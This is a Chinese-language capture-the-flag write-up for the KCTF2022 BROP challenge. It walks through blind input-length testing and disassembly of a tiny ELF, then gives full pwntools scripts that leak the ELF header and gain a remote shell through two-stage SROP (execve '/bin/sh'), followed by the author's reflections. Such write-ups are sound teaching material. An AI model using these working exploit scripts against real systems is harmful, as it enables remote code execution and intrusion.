# KCTF2022 春第六题 BROP writeup

## 题目信息
- 题目：`KCTF2022 春第六题 BROP`
- 方向：`Pwn`
- 类型：`Blind Pwn / BROP / SROP`
- 目标：`nc 123.57.66.184 10025`
- 最终 flag：`flag{1654821f-980b-42ac-a638-32b33d94029a}`

---

## 一句话结论

这题表面上是 BROP，但真正的落点是：

```text
少量盲测确认输入边界
-> 校正出极小 ELF 模型
-> 利用 read/syscall 结构走 SROP
-> 泄露程序头验证同源性
-> 两段式 SROP getshell
-> cat /flag
```

也就是说：

> **BROP 是入口，SROP 才是终点。**

---

## 1. 初始侦察

连接远端：

```bash
nc 123.57.66.184 10025
```

返回：

```text
hacker, TNT!
```

发送空行后：

```text
TNT TNT!
```

说明：
- 服务很小
- 是按行读取输入
- 明显是手写/极简风格 ELF，而不是常规 libc 菜单程序

---

## 2. 边界测试

逐步增加输入长度后发现：

- `1 ~ 15` 字节：正常
- `16` 字节开始：稳定 EOF

结论：

```text
15 字节以内安全，16 字节触发异常
```

进一步测试还表明：
- 字节内容对结果几乎无影响
- `\x00`、`\xff`、`\r`、`\t` 都不会改变分界
- 必须有行结束，否则服务不会进入预期处理流程

---

## 3. 为什么前面容易打偏

如果只盯着题面里的“BROP”，很容易机械进入：

```text
扫 stop gadget -> 扫 pop gadget -> 猜偏移 -> 猜基址
```

但这题真正的问题在于：
- 程序极小
- 没有 puts/printf 这类常规泄露链
- 更适合围绕 `read/syscall` 去想 SROP

如果持续盲扫大片地址，收益很低；一旦明确这是极小 ELF，就应该尽快转向 **程序结构泄露 + SROP**。

---

## 4. 关键地址

结合题目对应程序结构，关键地址如下：

```python
base    = 0x400000
main    = 0x4000B0
readRet = 0x4000EE
sysCall = 0x400100
bss     = 0x600108
```

关键汇编：

```asm
4000B0  mov eax, 1
4000B5  mov rdi, rax
4000B8  mov rsi, offset hello
4000C2  mov edx, 0xD
4000C7  syscall              ; write(1, hello, 0xD)
4000C9  call TNT66666

4000CE  mov eax, 1
4000D3  mov rdi, rax
4000D6  mov rsi, offset byebye
4000E0  mov edx, 9
4000E5  syscall              ; write(1, byebye, 9)
4000E7  mov eax, 0x3c
4000EC  syscall              ; exit

4000EE  sub rsp, 0x10
4000F2  xor rax, rax
4000F5  mov edx, 0x400
4000FA  mov rsi, rsp
4000FD  mov rdi, rax
400100  syscall              ; read(0, rsp, 0x400)
400102  add rsp, 0x10
400106  ret
```

这里最关键的是：

```asm
400100 syscall
400102 add rsp, 0x10
400106 ret
```

这个 `add rsp, 0x10` 会影响第二段 SROP 的栈布局，是整题最容易踩坑的点之一。

---

## 5. 先泄露 ELF 头验证同源性

先不急着 getshell，而是伪造一段 SROP，做：

```c
write(1, 0x400000, 0x200)
```

把程序头打出来。

### 验证脚本

```python
from pwn import *
from time import sleep

context.arch = 'amd64'
context.log_level = 'error'

host = '123.57.66.184'
port = 10025

readRet = 0x4000EE
sysCall = 0x400100
base = 0x400000

p = remote(host, port)
p.recvuntil(b'hacker, TNT!\n')

frame = SigreturnFrame()
frame.rip = sysCall
frame.rax = 1
frame.rdi = 1
frame.rsi = base
frame.rdx = 0x200
frame.rsp = base
frame.rbp = base

payload = b'A'*0x10 + p64(readRet) + p64(sysCall) + bytes(frame)
p.sendline(payload)
sleep(0.1)
p.send(b'A'*15)

data = p.recv(timeout=2)
print(data[:64])
p.close()
```

返回：

```text
b'\x7fELF\x02\x01\x01...'
```

这说明：
- 程序基址确实是 `0x400000`
- 当前远端与这份极小 ELF 模型同源
- 后续可以稳定按该结构进行利用

---

## 6. 最终利用思路

### Stage 1
先做：

```c
read(0, 0x600108, 0x400)
```

把第二段 payload 读进 `.bss`。

### Stage 2
再伪造：

```c
execve("/bin/sh", 0, 0)
```

拿到 shell 后执行：

```bash
cat /flag
```

---

## 7. 最终命中 exp

```python
from pwn import *
from time import sleep

context.log_level = 'error'
context.arch = 'amd64'

host='123.57.66.184'
port=10025

bss = 0x600108
readRet = 0x4000EE
sysCall = 0x400100

p = remote(host, port, timeout=4)
p.recvuntil(b'hacker, TNT!\n', timeout=1)

# Stage 1: SROP -> read(0, bss, 0x400)
frame = SigreturnFrame()
frame.rip = sysCall
frame.rax = 0
frame.rdi = 0
frame.rsi = bss
frame.rdx = 0x400
frame.rsp = bss
frame.rbp = bss
payload1 = p64(0xdeadbeef)*2 + p64(readRet) + p64(sysCall) + bytes(frame)
p.sendafter(b'hacker, TNT!\n', payload1)
sleep(0.1)
p.send(b'A'*15)

# Stage 2: SROP -> execve('/bin/sh', 0, 0)
sysFrame = SigreturnFrame()
sysFrame.rip = sysCall
sysFrame.rax = 59
sysFrame.rdi = bss
sysFrame.rsi = 0
sysFrame.rdx = 0
payload2 = b'/bin/sh\x00' + p64(0xdeadbeef) + p64(readRet) + p64(sysCall) + bytes(sysFrame)
sleep(0.1)
p.send(payload2)
sleep(0.1)
p.send(b'A'*15)

p.sendline(b'cat /flag; cat /flag.txt; ls /')
print(p.recv(timeout=2).decode('latin-1', 'replace'))
print(p.recv(timeout=2).decode('latin-1', 'replace'))

p.interactive()
```

返回：

```text
flag{1654821f-980b-42ac-a638-32b33d94029a}
```

---

## 8. 为什么能成

### `readRet = 0x4000EE`
它进入那个读输入的小函数，相当于重新给我们一次 `read`。

### `sysCall = 0x400100`
它让我们能配合 `SigreturnFrame` 直接伪造寄存器状态，从而完成任意 syscall。

### 第一段 SROP
第一段不是直接 getshell，而是把第二段 payload 安全读到 `.bss` 并迁移栈。

### 第二段 SROP
第二段直接做：

```c
execve('/bin/sh', 0, 0)
```

随后执行 `cat /flag` 即可。

---

## 9. 我为什么前面会打偏（反思）

这题最值得复盘的是这个部分。

### 反思 1：被“BROP”三个字带偏了
我前面一开始把它完全当成经典 blind ROP 题去处理，重心放在：
- stop gadget 盲扫
- pop gadget 盲扫
- 多偏移横向猜测
- 常规 `0x400000` 代码段大片尝试

这些动作不能说完全错误，但它们只是前期探路手段，不应该长期停留。

**真正高效的路径**应该是：

```text
确认这是极小 ELF
-> 优先考虑 syscall / read / SROP
-> 先把程序结构泄露出来
-> 拿到确定地址后再做确定性利用
```

### 反思 2：测试做得够，但策略切换不够快
前期我已经摸到了很多正确现象：
- 15/16 分界
- 服务能重连
- 内容不敏感、长度敏感
- 按行读取

这些都是真信息。

问题不在于测试错了，而在于：

> **测试结果出来后，没有足够快地从“继续扫”切换到“重新建模”。**

### 反思 3：拿到明确程序结构后，就该停止继续猜 gadget
一旦确认：

```text
base    = 0x400000
readRet = 0x4000EE
sysCall = 0x400100
```

并且成功泄露出了 ELF 头，后面就不应该再沉迷盲扫，而是应该立即转入确定性 SROP 利用。

这题最核心的纪律就是：

> **有确定地址时，立刻放弃不确定猜测。**

### 反思 4：`add rsp, 0x10` 这个坑必须显式记住
如果忽略：

```asm
400102 add rsp, 0x10
```

那么第二段 payload 很容易因为栈平衡错位而失败。

这类极小 ELF + syscall 题里，栈平衡细节比“概念上会 SROP”更重要。

---

## 10. 最终结论

这题最终应该记住的不是“我扫到了哪个 gadget”，而是：

```text
BROP 只是入口，不是终点。
极小 ELF 场景下，拿到结构后要尽快切 SROP。
```

最终 flag：

```text
flag{1654821f-980b-42ac-a638-32b33d94029a}
```
